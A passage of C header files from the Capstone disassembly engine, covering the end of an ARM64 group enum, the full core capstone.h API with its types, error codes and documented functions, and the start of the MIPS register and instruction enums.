	ARM64_GRP_FPARMV8,
	ARM64_GRP_NEON,
	ARM64_GRP_CRC,

	ARM64_GRP_ENDING,  // <-- mark the end of the list of groups
} arm64_insn_group;

#ifdef __cplusplus
}
#endif

#endif

```

`libs/Capstone/include/capstone.h`:

```h
#ifndef CAPSTONE_ENGINE_H
#define CAPSTONE_ENGINE_H

/* Capstone Disassembly Engine */
/* By Nguyen Anh Quynh <aquynh@gmail.com>, 2013-2014 */

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include <stdarg.h>
#if defined(CAPSTONE_HAS_OSXKERNEL)
#include <libkern/libkern.h>
#else
#include <stdlib.h>
#include <stdio.h>
#endif

#include "platform.h"

#ifdef _MSC_VER
#pragma warning(disable:4201)
#pragma warning(disable:4100)
#ifdef CAPSTONE_SHARED
#define CAPSTONE_EXPORT __declspec(dllexport)
#else    // defined(CAPSTONE_STATIC)
#define CAPSTONE_EXPORT
#endif
#else
#ifdef __GNUC__
#define CAPSTONE_EXPORT __attribute__((visibility("default")))
#else
#define CAPSTONE_EXPORT
#endif
#endif

#ifdef __GNUC__
#define CAPSTONE_DEPRECATED __attribute__((deprecated))
#elif defined(_MSC_VER)
#define CAPSTONE_DEPRECATED __declspec(deprecated)
#else
#pragma message("WARNING: You need to implement CAPSTONE_DEPRECATED for this compiler")
#define CAPSTONE_DEPRECATED
#endif

// Capstone API version
#define CS_API_MAJOR 3
#define CS_API_MINOR 0

// Macro to create combined version which can be compared to
// result of cs_version() API.
#define CS_MAKE_VERSION(major, minor) ((major << 8) + minor)

// Handle using with all API
typedef size_t csh;

// Architecture type
typedef enum cs_arch {
	CS_ARCH_ARM = 0,	// ARM architecture (including Thumb, Thumb-2)
	CS_ARCH_ARM64,		// ARM-64, also called AArch64
	CS_ARCH_MIPS,		// Mips architecture
	CS_ARCH_X86,		// X86 architecture (including x86 & x86-64)
	CS_ARCH_PPC,		// PowerPC architecture
	CS_ARCH_SPARC,		// Sparc architecture
	CS_ARCH_SYSZ,		// SystemZ architecture
	CS_ARCH_XCORE,		// XCore architecture
	CS_ARCH_MAX,
	CS_ARCH_ALL = 0xFFFF, // All architectures - for cs_support()
} cs_arch;

// Support value to verify diet mode of the engine.
// If cs_support(CS_SUPPORT_DIET) return True, the engine was compiled
// in diet mode.
#define CS_SUPPORT_DIET (CS_ARCH_ALL + 1)

// Support value to verify X86 reduce mode of the engine.
// If cs_support(CS_SUPPORT_X86_REDUCE) return True, the engine was compiled
// in X86 reduce mode.
#define CS_SUPPORT_X86_REDUCE (CS_ARCH_ALL + 2)

// Mode type
typedef enum cs_mode {
	CS_MODE_LITTLE_ENDIAN = 0,	// little-endian mode (default mode)
	CS_MODE_ARM = 0,	// 32-bit ARM
	CS_MODE_16 = 1 << 1,	// 16-bit mode (X86)
	CS_MODE_32 = 1 << 2,	// 32-bit mode (X86)
	CS_MODE_64 = 1 << 3,	// 64-bit mode (X86, PPC)
	CS_MODE_THUMB = 1 << 4,	// ARM's Thumb mode, including Thumb-2
	CS_MODE_MCLASS = 1 << 5,	// ARM's Cortex-M series
	CS_MODE_V8 = 1 << 6,	// ARMv8 A32 encodings for ARM
	CS_MODE_MICRO = 1 << 4, // MicroMips mode (MIPS)
	CS_MODE_MIPS3 = 1 << 5, // Mips III ISA
	CS_MODE_MIPS32R6 = 1 << 6, // Mips32r6 ISA
	CS_MODE_MIPSGP64 = 1 << 7, // General Purpose Registers are 64-bit wide (MIPS)
	CS_MODE_V9 = 1 << 4, // SparcV9 mode (Sparc)
	CS_MODE_BIG_ENDIAN = 1 << 31,	// big-endian mode
	CS_MODE_MIPS32 = CS_MODE_32,	// Mips32 ISA (Mips)
	CS_MODE_MIPS64 = CS_MODE_64,	// Mips64 ISA (Mips)
} cs_mode;

typedef void* (*cs_malloc_t)(size_t size);
typedef void* (*cs_calloc_t)(size_t nmemb, size_t size);
typedef void* (*cs_realloc_t)(void *ptr, size_t size);
typedef void (*cs_free_t)(void *ptr);
typedef int (*cs_vsnprintf_t)(char *str, size_t size, const char *format, va_list ap);


// User-defined dynamic memory related functions: malloc/calloc/realloc/free/vsnprintf()
// By default, Capstone uses system's malloc(), calloc(), realloc(), free() & vsnprintf().
typedef struct cs_opt_mem {
	cs_malloc_t malloc;
	cs_calloc_t calloc;
	cs_realloc_t realloc;
	cs_free_t free;
	cs_vsnprintf_t vsnprintf;
} cs_opt_mem;

// Runtime option for the disassembled engine
typedef enum cs_opt_type {
	CS_OPT_SYNTAX = 1,	// Assembly output syntax
	CS_OPT_DETAIL,	// Break down instruction structure into details
	CS_OPT_MODE,	// Change engine's mode at run-time
	CS_OPT_MEM,	// User-defined dynamic memory related functions
	CS_OPT_SKIPDATA, // Skip data when disassembling. Then engine is in SKIPDATA mode.
	CS_OPT_SKIPDATA_SETUP, // Setup user-defined function for SKIPDATA option
} cs_opt_type;

// Runtime option value (associated with option type above)
typedef enum cs_opt_value {
	CS_OPT_OFF = 0,  // Turn OFF an option - default option of CS_OPT_DETAIL, CS_OPT_SKIPDATA.
	CS_OPT_ON = 3, // Turn ON an option (CS_OPT_DETAIL, CS_OPT_SKIPDATA).
	CS_OPT_SYNTAX_DEFAULT = 0, // Default asm syntax (CS_OPT_SYNTAX).
	CS_OPT_SYNTAX_INTEL, // X86 Intel asm syntax - default on X86 (CS_OPT_SYNTAX).
	CS_OPT_SYNTAX_ATT,   // X86 ATT asm syntax (CS_OPT_SYNTAX).
	CS_OPT_SYNTAX_NOREGNAME, // Prints register name with only number (CS_OPT_SYNTAX)
} cs_opt_value;

//> Common instruction operand types - to be consistent across all architectures.
typedef enum cs_op_type {
	CS_OP_INVALID = 0,  // uninitialized/invalid operand.
	CS_OP_REG,          // Register operand.
	CS_OP_IMM,          // Immediate operand.
	CS_OP_MEM,          // Memory operand.
	CS_OP_FP,           // Floating-Point operand.
} cs_op_type;

//> Common instruction groups - to be consistent across all architectures.
typedef enum cs_group_type {
	CS_GRP_INVALID = 0,  // uninitialized/invalid group.
	CS_GRP_JUMP,    // all jump instructions (conditional+direct+indirect jumps)
	CS_GRP_CALL,    // all call instructions
	CS_GRP_RET,     // all return instructions
	CS_GRP_INT,     // all interrupt instructions (int+syscall)
	CS_GRP_IRET,    // all interrupt return instructions
} cs_group_type;

/*
 User-defined callback function for SKIPDATA option.
 See tests/test_skipdata.c for sample code demonstrating this API.

 @code: the input buffer containing code to be disassembled.
        This is the same buffer passed to cs_disasm().
 @code_size: size (in bytes) of the above @code buffer.
 @offset: the position of the currently-examining byte in the input
      buffer @code mentioned above.
 @user_data: user-data passed to cs_option() via @user_data field in
      cs_opt_skipdata struct below.

 @return: return number of bytes to skip, or 0 to immediately stop disassembling.
*/
typedef size_t (*cs_skipdata_cb_t)(const uint8_t *code, size_t code_size, size_t offset, void *user_data);

// User-customized setup for SKIPDATA option
typedef struct cs_opt_skipdata {
	// Capstone considers data to skip as special "instructions".
	// User can specify the string for this instruction's "mnemonic" here.
	// By default (if @mnemonic is NULL), Capstone use ".byte".
	const char *mnemonic;

	// User-defined callback function to be called when Capstone hits data.
	// If the returned value from this callback is positive (>0), Capstone
	// will skip exactly that number of bytes & continue. Otherwise, if
	// the callback returns 0, Capstone stops disassembling and returns
	// immediately from cs_disasm()
	// NOTE: if this callback pointer is NULL, Capstone would skip a number
	// of bytes depending on architectures, as following:
	// Arm:     2 bytes (Thumb mode) or 4 bytes.
	// Arm64:   4 bytes.
	// Mips:    4 bytes.
	// PowerPC: 4 bytes.
	// Sparc:   4 bytes.
	// SystemZ: 2 bytes.
	// X86:     1 bytes.
	// XCore:   2 bytes.
	cs_skipdata_cb_t callback; 	// default value is NULL

	// User-defined data to be passed to @callback function pointer.
	void *user_data;
} cs_opt_skipdata;


#include "arm.h"
#include "arm64.h"
#include "mips.h"
#include "ppc.h"
#include "sparc.h"
#include "systemz.h"
#include "x86.h"
#include "xcore.h"

// NOTE: All information in cs_detail is only available when CS_OPT_DETAIL = CS_OPT_ON
typedef struct cs_detail {
	uint8_t regs_read[12]; // list of implicit registers read by this insn
	uint8_t regs_read_count; // number of implicit registers read by this insn

	uint8_t regs_write[20]; // list of implicit registers modified by this insn
	uint8_t regs_write_count; // number of implicit registers modified by this insn

	uint8_t groups[8]; // list of group this instruction belong to
	uint8_t groups_count; // number of groups this insn belongs to

	// Architecture-specific instruction info
	union {
		cs_x86 x86;	// X86 architecture, including 16-bit, 32-bit & 64-bit mode
		cs_arm64 arm64;	// ARM64 architecture (aka AArch64)
		cs_arm arm;		// ARM architecture (including Thumb/Thumb2)
		cs_mips mips;	// MIPS architecture
		cs_ppc ppc;	// PowerPC architecture
		cs_sparc sparc;	// Sparc architecture
		cs_sysz sysz;	// SystemZ architecture
		cs_xcore xcore;	// XCore architecture
	};
} cs_detail;

// Detail information of disassembled instruction
typedef struct cs_insn {
	// Instruction ID (basically a numeric ID for the instruction mnemonic)
	// Find the instruction id in the '[ARCH]_insn' enum in the header file 
	// of corresponding architecture, such as 'arm_insn' in arm.h for ARM,
	// 'x86_insn' in x86.h for X86, etc...
	// This information is available even when CS_OPT_DETAIL = CS_OPT_OFF
	// NOTE: in Skipdata mode, "data" instruction has 0 for this id field.
	unsigned int id;

	// Address (EIP) of this instruction
	// This information is available even when CS_OPT_DETAIL = CS_OPT_OFF
	uint64_t address;

	// Size of this instruction
	// This information is available even when CS_OPT_DETAIL = CS_OPT_OFF
	uint16_t size;
	// Machine bytes of this instruction, with number of bytes indicated by @size above
	// This information is available even when CS_OPT_DETAIL = CS_OPT_OFF
	uint8_t bytes[16];

	// Ascii text of instruction mnemonic
	// This information is available even when CS_OPT_DETAIL = CS_OPT_OFF
	char mnemonic[32];

	// Ascii text of instruction operands
	// This information is available even when CS_OPT_DETAIL = CS_OPT_OFF
	char op_str[160];

	// Pointer to cs_detail.
	// NOTE: detail pointer is only valid when both requirements below are met:
	// (1) CS_OP_DETAIL = CS_OPT_ON
	// (2) Engine is not in Skipdata mode (CS_OP_SKIPDATA option set to CS_OPT_ON)
	//
	// NOTE 2: when in Skipdata mode, or when detail mode is OFF, even if this pointer
	//     is not NULL, its content is still irrelevant.
	cs_detail *detail;
} cs_insn;


// Calculate the offset of a disassembled instruction in its buffer, given its position
// in its array of disassembled insn
// NOTE: this macro works with position (>=1), not index
#define CS_INSN_OFFSET(insns, post) (insns[post - 1].address - insns[0].address)


// All type of errors encountered by Capstone API.
// These are values returned by cs_errno()
typedef enum cs_err {
	CS_ERR_OK = 0,   // No error: everything was fine
	CS_ERR_MEM,      // Out-Of-Memory error: cs_open(), cs_disasm(), cs_disasm_iter()
	CS_ERR_ARCH,     // Unsupported architecture: cs_open()
	CS_ERR_HANDLE,   // Invalid handle: cs_op_count(), cs_op_index()
	CS_ERR_CSH,	     // Invalid csh argument: cs_close(), cs_errno(), cs_option()
	CS_ERR_MODE,     // Invalid/unsupported mode: cs_open()
	CS_ERR_OPTION,   // Invalid/unsupported option: cs_option()
	CS_ERR_DETAIL,   // Information is unavailable because detail option is OFF
	CS_ERR_MEMSETUP, // Dynamic memory management uninitialized (see CS_OPT_MEM)
	CS_ERR_VERSION,  // Unsupported version (bindings)
	CS_ERR_DIET,     // Access irrelevant data in "diet" engine
	CS_ERR_SKIPDATA, // Access irrelevant data for "data" instruction in SKIPDATA mode
	CS_ERR_X86_ATT,  // X86 AT&T syntax is unsupported (opt-out at compile time)
	CS_ERR_X86_INTEL, // X86 Intel syntax is unsupported (opt-out at compile time)
} cs_err;

/*
 Return combined API version & major and minor version numbers.

 @major: major number of API version
 @minor: minor number of API version

 @return hexical number as (major << 8 | minor), which encodes both
	 major & minor versions.
	 NOTE: This returned value can be compared with version number made
	 with macro CS_MAKE_VERSION

 For example, second API version would return 1 in @major, and 1 in @minor
 The return value would be 0x0101

 NOTE: if you only care about returned value, but not major and minor values,
 set both @major & @minor arguments to NULL.
*/
CAPSTONE_EXPORT
unsigned int cs_version(int *major, int *minor);


/*
 This API can be used to either ask for archs supported by this library,
 or check to see if the library was compile with 'diet' option (or called
 in 'diet' mode).

 To check if a particular arch is supported by this library, set @query to
 arch mode (CS_ARCH_* value).
 To verify if this library supports all the archs, use CS_ARCH_ALL.

 To check if this library is in 'diet' mode, set @query to CS_SUPPORT_DIET.

 @return True if this library supports the given arch, or in 'diet' mode.
*/
CAPSTONE_EXPORT
bool cs_support(int query);

/*
 Initialize CS handle: this must be done before any usage of CS.

 @arch: architecture type (CS_ARCH_*)
 @mode: hardware mode. This is combined of CS_MODE_*
 @handle: pointer to handle, which will be updated at return time

 @return CS_ERR_OK on success, or other value on failure (refer to cs_err enum
 for detailed error).
*/
CAPSTONE_EXPORT
cs_err cs_open(cs_arch arch, cs_mode mode, csh *handle);

/*
 Close CS handle: MUST do to release the handle when it is not used anymore.
 NOTE: this must be only called when there is no longer usage of Capstone,
 not even access to cs_insn array. The reason is the this API releases some
 cached memory, thus access to any Capstone API after cs_close() might crash
 your application.

 In fact,this API invalidate @handle by ZERO out its value (i.e *handle = 0).

 @handle: pointer to a handle returned by cs_open()

 @return CS_ERR_OK on success, or other value on failure (refer to cs_err enum
 for detailed error).
*/
CAPSTONE_EXPORT
cs_err cs_close(csh *handle);

/*
 Set option for disassembling engine at runtime

 @handle: handle returned by cs_open()
 @type: type of option to be set
 @value: option value corresponding with @type

 @return: CS_ERR_OK on success, or other value on failure.
 Refer to cs_err enum for detailed error.

 NOTE: in the case of CS_OPT_MEM, handle's value can be anything,
 so that cs_option(handle, CS_OPT_MEM, value) can (i.e must) be called
 even before cs_open()
*/
CAPSTONE_EXPORT
cs_err cs_option(csh handle, cs_opt_type type, size_t value);

/*
 Report the last error number when some API function fail.
 Like glibc's errno, cs_errno might not retain its old value once accessed.

 @handle: handle returned by cs_open()

 @return: error code of cs_err enum type (CS_ERR_*, see above)
*/
CAPSTONE_EXPORT
cs_err cs_errno(csh handle);


/*
 Return a string describing given error code.

 @code: error code (see CS_ERR_* above)

 @return: returns a pointer to a string that describes the error code
	passed in the argument @code
*/
CAPSTONE_EXPORT
const char *cs_strerror(cs_err code);

/*
 Disassemble binary code, given the code buffer, size, address and number
 of instructions to be decoded.
 This API dynamically allocate memory to contain disassembled instruction.
 Resulted instructions will be put into @*insn

 NOTE 1: this API will automatically determine memory needed to contain
 output disassembled instructions in @insn.

 NOTE 2: caller must free the allocated memory itself to avoid memory leaking.

 NOTE 3: for system with scarce memory to be dynamically allocated such as
 OS kernel or firmware, the API cs_disasm_iter() might be a better choice than
 cs_disasm(). The reason is that with cs_disasm(), based on limited available
 memory, we have to calculate in advance how many instructions to be disassembled,
 which complicates things. This is especially troublesome for the case @count=0,
 when cs_disasm() runs uncontrollably (until either end of input buffer, or
 when it encounters an invalid instruction).
 
 @handle: handle returned by cs_open()
 @code: buffer containing raw binary code to be disassembled.
 @code_size: size of the above code buffer.
 @address: address of the first instruction in given raw code buffer.
 @insn: array of instructions filled in by this API.
	   NOTE: @insn will be allocated by this function, and should be freed
	   with cs_free() API.
 @count: number of instructions to be disassembled, or 0 to get all of them

 @return: the number of successfully disassembled instructions,
 or 0 if this function failed to disassemble the given code

 On failure, call cs_errno() for error code.
*/
CAPSTONE_EXPORT
size_t cs_disasm(csh handle,
		const uint8_t *code, size_t code_size,
		uint64_t address,
		size_t count,
		cs_insn **insn);

/*
  Deprecated function - to be retired in the next version!
  Use cs_disasm() instead of cs_disasm_ex()
*/
CAPSTONE_EXPORT
CAPSTONE_DEPRECATED
size_t cs_disasm_ex(csh handle,
		const uint8_t *code, size_t code_size,
		uint64_t address,
		size_t count,
		cs_insn **insn);

/*
 Free memory allocated by cs_malloc() or cs_disasm() (argument @insn)

 @insn: pointer returned by @insn argument in cs_disasm() or cs_malloc()
 @count: number of cs_insn structures returned by cs_disasm(), or 1
     to free memory allocated by cs_malloc().
*/
CAPSTONE_EXPORT
void cs_free(cs_insn *insn, size_t count);


/*
 Allocate memory for 1 instruction to be used by cs_disasm_iter().

 @handle: handle returned by cs_open()

 NOTE: when no longer in use, you can reclaim the memory allocated for
 this instruction with cs_free(insn, 1)
*/
CAPSTONE_EXPORT
cs_insn *cs_malloc(csh handle);

/*
 Fast API to disassemble binary code, given the code buffer, size, address
 and number of instructions to be decoded.
 This API put the resulted instruction into a given cache in @insn.
 See tests/test_iter.c for sample code demonstrating this API.

 NOTE 1: this API will update @code, @size & @address to point to the next
 instruction in the input buffer. Therefore, it is convenient to use
 cs_disasm_iter() inside a loop to quickly iterate all the instructions.
 While decoding one instruction at a time can also be achieved with
 cs_disasm(count=1), some benchmarks shown that cs_disasm_iter() can be 30%
 faster on random input.

 NOTE 2: the cache in @insn can be created with cs_malloc() API.

 NOTE 3: for system with scarce memory to be dynamically allocated such as
 OS kernel or firmware, this API is recommended over cs_disasm(), which
 allocates memory based on the number of instructions to be disassembled.
 The reason is that with cs_disasm(), based on limited available memory,
 we have to calculate in advance how many instructions to be disassembled,
 which complicates things. This is especially troublesome for the case
 @count=0, when cs_disasm() runs uncontrollably (until either end of input
 buffer, or when it encounters an invalid instruction).
 
 @handle: handle returned by cs_open()
 @code: buffer containing raw binary code to be disassembled
 @code_size: size of above code
 @address: address of the first insn in given raw code buffer
 @insn: pointer to instruction to be filled in by this API.

 @return: true if this API successfully decode 1 instruction,
 or false otherwise.

 On failure, call cs_errno() for error code.
*/
CAPSTONE_EXPORT
bool cs_disasm_iter(csh handle,
	const uint8_t **code, size_t *size,
	uint64_t *address, cs_insn *insn);

/*
 Return friendly name of register in a string.
 Find the instruction id from header file of corresponding architecture (arm.h for ARM,
 x86.h for X86, ...)

 WARN: when in 'diet' mode, this API is irrelevant because engine does not
 store register name.

 @handle: handle returned by cs_open()
 @reg_id: register id

 @return: string name of the register, or NULL if @reg_id is invalid.
*/
CAPSTONE_EXPORT
const char *cs_reg_name(csh handle, unsigned int reg_id);

/*
 Return friendly name of an instruction in a string.
 Find the instruction id from header file of corresponding architecture (arm.h for ARM, x86.h for X86, ...)

 WARN: when in 'diet' mode, this API is irrelevant because the engine does not
 store instruction name.

 @handle: handle returned by cs_open()
 @insn_id: instruction id

 @return: string name of the instruction, or NULL if @insn_id is invalid.
*/
CAPSTONE_EXPORT
const char *cs_insn_name(csh handle, unsigned int insn_id);

/*
 Return friendly name of a group id (that an instruction can belong to)
 Find the group id from header file of corresponding architecture (arm.h for ARM, x86.h for X86, ...)

 WARN: when in 'diet' mode, this API is irrelevant because the engine does not
 store group name.

 @handle: handle returned by cs_open()
 @group_id: group id

 @return: string name of the group, or NULL if @group_id is invalid.
*/
CAPSTONE_EXPORT
const char *cs_group_name(csh handle, unsigned int group_id);

/*
 Check if a disassembled instruction belong to a particular group.
 Find the group id from header file of corresponding architecture (arm.h for ARM, x86.h for X86, ...)
 Internally, this simply verifies if @group_id matches any member of insn->groups array.

 NOTE: this API is only valid when detail option is ON (which is OFF by default).

 WARN: when in 'diet' mode, this API is irrelevant because the engine does not
 update @groups array.

 @handle: handle returned by cs_open()
 @insn: disassembled instruction structure received from cs_disasm() or cs_disasm_iter()
 @group_id: group that you want to check if this instruction belong to.

 @return: true if this instruction indeed belongs to aboved group, or false otherwise.
*/
CAPSTONE_EXPORT
bool cs_insn_group(csh handle, const cs_insn *insn, unsigned int group_id);

/*
 Check if a disassembled instruction IMPLICITLY used a particular register.
 Find the register id from header file of corresponding architecture (arm.h for ARM, x86.h for X86, ...)
 Internally, this simply verifies if @reg_id matches any member of insn->regs_read array.

 NOTE: this API is only valid when detail option is ON (which is OFF by default)

 WARN: when in 'diet' mode, this API is irrelevant because the engine does not
 update @regs_read array.

 @insn: disassembled instruction structure received from cs_disasm() or cs_disasm_iter()
 @reg_id: register that you want to check if this instruction used it.

 @return: true if this instruction indeed implicitly used aboved register, or false otherwise.
*/
CAPSTONE_EXPORT
bool cs_reg_read(csh handle, const cs_insn *insn, unsigned int reg_id);

/*
 Check if a disassembled instruction IMPLICITLY modified a particular register.
 Find the register id from header file of corresponding architecture (arm.h for ARM, x86.h for X86, ...)
 Internally, this simply verifies if @reg_id matches any member of insn->regs_write array.

 NOTE: this API is only valid when detail option is ON (which is OFF by default)

 WARN: when in 'diet' mode, this API is irrelevant because the engine does not
 update @regs_write array.

 @insn: disassembled instruction structure received from cs_disasm() or cs_disasm_iter()
 @reg_id: register that you want to check if this instruction modified it.

 @return: true if this instruction indeed implicitly modified aboved register, or false otherwise.
*/
CAPSTONE_EXPORT
bool cs_reg_write(csh handle, const cs_insn *insn, unsigned int reg_id);

/*
 Count the number of operands of a given type.
 Find the operand type in header file of corresponding architecture (arm.h for ARM, x86.h for X86, ...)

 NOTE: this API is only valid when detail option is ON (which is OFF by default)

 @handle: handle returned by cs_open()
 @insn: disassembled instruction structure received from cs_disasm() or cs_disasm_iter()
 @op_type: Operand type to be found.

 @return: number of operands of given type @op_type in instruction @insn,
 or -1 on failure.
*/
CAPSTONE_EXPORT
int cs_op_count(csh handle, const cs_insn *insn, unsigned int op_type);

/*
 Retrieve the position of operand of given type in <arch>.operands[] array.
 Later, the operand can be accessed using the returned position.
 Find the operand type in header file of corresponding architecture (arm.h for ARM, x86.h for X86, ...)

 NOTE: this API is only valid when detail option is ON (which is OFF by default)

 @handle: handle returned by cs_open()
 @insn: disassembled instruction structure received from cs_disasm() or cs_disasm_iter()
 @op_type: Operand type to be found.
 @position: position of the operand to be found. This must be in the range
			[1, cs_op_count(handle, insn, op_type)]

 @return: index of operand of given type @op_type in <arch>.operands[] array
 in instruction @insn, or -1 on failure.
*/
CAPSTONE_EXPORT
int cs_op_index(csh handle, const cs_insn *insn, unsigned int op_type,
		unsigned int position);

#ifdef __cplusplus
}
#endif

#endif

```

`libs/Capstone/include/mips.h`:

```h
#ifndef CAPSTONE_MIPS_H
#define CAPSTONE_MIPS_H

/* Capstone Disassembly Engine */
/* By Nguyen Anh Quynh <aquynh@gmail.com>, 2013-2014 */

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include "platform.h"

// GCC MIPS toolchain has a default macro called "mips" which breaks
// compilation
#undef mips

#ifdef _MSC_VER
#pragma warning(disable:4201)
#endif

//> Operand type for instruction's operands
typedef enum mips_op_type {
	MIPS_OP_INVALID = 0, // = CS_OP_INVALID (Uninitialized).
	MIPS_OP_REG, // = CS_OP_REG (Register operand).
	MIPS_OP_IMM, // = CS_OP_IMM (Immediate operand).
	MIPS_OP_MEM, // = CS_OP_MEM (Memory operand).
} mips_op_type;

// Instruction's operand referring to memory
// This is associated with MIPS_OP_MEM operand type above
typedef struct mips_op_mem {
	unsigned int base;	// base register
	int64_t disp;	// displacement/offset value
} mips_op_mem;

// Instruction operand
typedef struct cs_mips_op {
	mips_op_type type;	// operand type
	union {
		unsigned int reg;	// register value for REG operand
		int64_t imm;		// immediate value for IMM operand
		mips_op_mem mem;	// base/index/scale/disp value for MEM operand
	};
} cs_mips_op;

// Instruction structure
typedef struct cs_mips {
	// Number of operands of this instruction, 
	// or 0 when instruction has no operand.
	uint8_t op_count;
	cs_mips_op operands[8]; // operands for this instruction.
} cs_mips;

//> MIPS registers
typedef enum mips_reg {
	MIPS_REG_INVALID = 0,
	//> General purpose registers
	MIPS_REG_0,
	MIPS_REG_1,
	MIPS_REG_2,
	MIPS_REG_3,
	MIPS_REG_4,
	MIPS_REG_5,
	MIPS_REG_6,
	MIPS_REG_7,
	MIPS_REG_8,
	MIPS_REG_9,
	MIPS_REG_10,
	MIPS_REG_11,
	MIPS_REG_12,
	MIPS_REG_13,
	MIPS_REG_14,
	MIPS_REG_15,
	MIPS_REG_16,
	MIPS_REG_17,
	MIPS_REG_18,
	MIPS_REG_19,
	MIPS_REG_20,
	MIPS_REG_21,
	MIPS_REG_22,
	MIPS_REG_23,
	MIPS_REG_24,
	MIPS_REG_25,
	MIPS_REG_26,
	MIPS_REG_27,
	MIPS_REG_28,
	MIPS_REG_29,
	MIPS_REG_30,
	MIPS_REG_31,

	//> DSP registers
	MIPS_REG_DSPCCOND,
	MIPS_REG_DSPCARRY,
	MIPS_REG_DSPEFI,
	MIPS_REG_DSPOUTFLAG,
	MIPS_REG_DSPOUTFLAG16_19,
	MIPS_REG_DSPOUTFLAG20,
	MIPS_REG_DSPOUTFLAG21,
	MIPS_REG_DSPOUTFLAG22,
	MIPS_REG_DSPOUTFLAG23,
	MIPS_REG_DSPPOS,
	MIPS_REG_DSPSCOUNT,

	//> ACC registers
	MIPS_REG_AC0,
	MIPS_REG_AC1,
	MIPS_REG_AC2,
	MIPS_REG_AC3,

	//> COP registers
	MIPS_REG_CC0,
	MIPS_REG_CC1,
	MIPS_REG_CC2,
	MIPS_REG_CC3,
	MIPS_REG_CC4,
	MIPS_REG_CC5,
	MIPS_REG_CC6,
	MIPS_REG_CC7,

	//> FPU registers
	MIPS_REG_F0,
	MIPS_REG_F1,
	MIPS_REG_F2,
	MIPS_REG_F3,
	MIPS_REG_F4,
	MIPS_REG_F5,
	MIPS_REG_F6,
	MIPS_REG_F7,
	MIPS_REG_F8,
	MIPS_REG_F9,
	MIPS_REG_F10,
	MIPS_REG_F11,
	MIPS_REG_F12,
	MIPS_REG_F13,
	MIPS_REG_F14,
	MIPS_REG_F15,
	MIPS_REG_F16,
	MIPS_REG_F17,
	MIPS_REG_F18,
	MIPS_REG_F19,
	MIPS_REG_F20,
	MIPS_REG_F21,
	MIPS_REG_F22,
	MIPS_REG_F23,
	MIPS_REG_F24,
	MIPS_REG_F25,
	MIPS_REG_F26,
	MIPS_REG_F27,
	MIPS_REG_F28,
	MIPS_REG_F29,
	MIPS_REG_F30,
	MIPS_REG_F31,

	MIPS_REG_FCC0,
	MIPS_REG_FCC1,
	MIPS_REG_FCC2,
	MIPS_REG_FCC3,
	MIPS_REG_FCC4,
	MIPS_REG_FCC5,
	MIPS_REG_FCC6,
	MIPS_REG_FCC7,

	//> AFPR128
	MIPS_REG_W0,
	MIPS_REG_W1,
	MIPS_REG_W2,
	MIPS_REG_W3,
	MIPS_REG_W4,
	MIPS_REG_W5,
	MIPS_REG_W6,
	MIPS_REG_W7,
	MIPS_REG_W8,
	MIPS_REG_W9,
	MIPS_REG_W10,
	MIPS_REG_W11,
	MIPS_REG_W12,
	MIPS_REG_W13,
	MIPS_REG_W14,
	MIPS_REG_W15,
	MIPS_REG_W16,
	MIPS_REG_W17,
	MIPS_REG_W18,
	MIPS_REG_W19,
	MIPS_REG_W20,
	MIPS_REG_W21,
	MIPS_REG_W22,
	MIPS_REG_W23,
	MIPS_REG_W24,
	MIPS_REG_W25,
	MIPS_REG_W26,
	MIPS_REG_W27,
	MIPS_REG_W28,
	MIPS_REG_W29,
	MIPS_REG_W30,
	MIPS_REG_W31,

	MIPS_REG_HI,
	MIPS_REG_LO,

	MIPS_REG_P0,
	MIPS_REG_P1,
	MIPS_REG_P2,

	MIPS_REG_MPL0,
	MIPS_REG_MPL1,
	MIPS_REG_MPL2,

	MIPS_REG_ENDING,	// <-- mark the end of the list or registers

	// alias registers
	MIPS_REG_ZERO = MIPS_REG_0,
	MIPS_REG_AT = MIPS_REG_1,
	MIPS_REG_V0 = MIPS_REG_2,
	MIPS_REG_V1 = MIPS_REG_3,
	MIPS_REG_A0 = MIPS_REG_4,
	MIPS_REG_A1 = MIPS_REG_5,
	MIPS_REG_A2 = MIPS_REG_6,
	MIPS_REG_A3 = MIPS_REG_7,
	MIPS_REG_T0 = MIPS_REG_8,
	MIPS_REG_T1 = MIPS_REG_9,
	MIPS_REG_T2 = MIPS_REG_10,
	MIPS_REG_T3 = MIPS_REG_11,
	MIPS_REG_T4 = MIPS_REG_12,
	MIPS_REG_T5 = MIPS_REG_13,
	MIPS_REG_T6 = MIPS_REG_14,
	MIPS_REG_T7 = MIPS_REG_15,
	MIPS_REG_S0 = MIPS_REG_16,
	MIPS_REG_S1 = MIPS_REG_17,
	MIPS_REG_S2 = MIPS_REG_18,
	MIPS_REG_S3 = MIPS_REG_19,
	MIPS_REG_S4 = MIPS_REG_20,
	MIPS_REG_S5 = MIPS_REG_21,
	MIPS_REG_S6 = MIPS_REG_22,
	MIPS_REG_S7 = MIPS_REG_23,
	MIPS_REG_T8 = MIPS_REG_24,
	MIPS_REG_T9 = MIPS_REG_25,
	MIPS_REG_K0 = MIPS_REG_26,
	MIPS_REG_K1 = MIPS_REG_27,
	MIPS_REG_GP = MIPS_REG_28,
	MIPS_REG_SP = MIPS_REG_29,
	MIPS_REG_FP = MIPS_REG_30, MIPS_REG_S8 = MIPS_REG_30,
	MIPS_REG_RA = MIPS_REG_31,

	MIPS_REG_HI0 = MIPS_REG_AC0,
	MIPS_REG_HI1 = MIPS_REG_AC1,
	MIPS_REG_HI2 = MIPS_REG_AC2,
	MIPS_REG_HI3 = MIPS_REG_AC3,

	MIPS_REG_LO0 = MIPS_REG_HI0,
	MIPS_REG_LO1 = MIPS_REG_HI1,
	MIPS_REG_LO2 = MIPS_REG_HI2,
	MIPS_REG_LO3 = MIPS_REG_HI3,
} mips_reg;

//> MIPS instruction
typedef enum mips_insn {
	MIPS_INS_INVALID = 0,

	MIPS_INS_ABSQ_S,
	MIPS_INS_ADD,
	MIPS_INS_ADDIUPC,
	MIPS_INS_ADDQH,
	MIPS_INS_ADDQH_R,
	MIPS_INS_ADDQ,
	MIPS_INS_ADDQ_S,
	MIPS_INS_ADDSC,
	MIPS_INS_ADDS_A,
	MIPS_INS_ADDS_S,
	MIPS_INS_ADDS_U,
	MIPS_INS_ADDUH,
	MIPS_INS_ADDUH_R,
	MIPS_INS_ADDU,
	MIPS_INS_ADDU_S,
	MIPS_INS_ADDVI,
	MIPS_INS_ADDV,
	MIPS_INS_ADDWC,
	MIPS_INS_ADD_A,
	MIPS_INS_ADDI,
	MIPS_INS_ADDIU,
	MIPS_INS_ALIGN,
